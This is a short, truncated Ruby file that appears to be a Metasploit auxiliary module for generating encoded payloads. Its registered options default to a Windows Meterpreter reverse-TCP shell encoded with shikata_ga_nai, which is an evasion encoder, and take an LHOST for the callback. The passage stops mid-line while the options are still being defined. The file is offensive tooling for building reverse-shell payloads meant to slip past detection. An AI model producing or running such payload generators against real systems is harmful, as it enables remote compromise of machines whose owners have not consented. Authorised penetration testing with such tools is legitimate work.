##
# Custom Payload Generator with Encoding
##

require 'msf/core'

class MetasploitModule < Msf::Auxiliary
  def initialize(info = {})
    super(
      update_info(
        info,
        'Name'        => 'Custom Payload Generator',
        'Description' => 'Generates a custom encoded payload using Metasploit encoders',
        'Author'      => ['Farid Mirzazada'],
        'License'     => MSF_LICENSE
      )
    )

    register_options(
      [
        OptString.new('PAYLOAD', [true, 'Payload to generate', 'windows/meterpreter/reverse_tcp']),
        OptString.new('ENCODER', [true, 'Encoder to use', 'x86/shikata_ga_nai']),
        OptAddress.new('LHOST', [true, 'Local host']),
        OptI
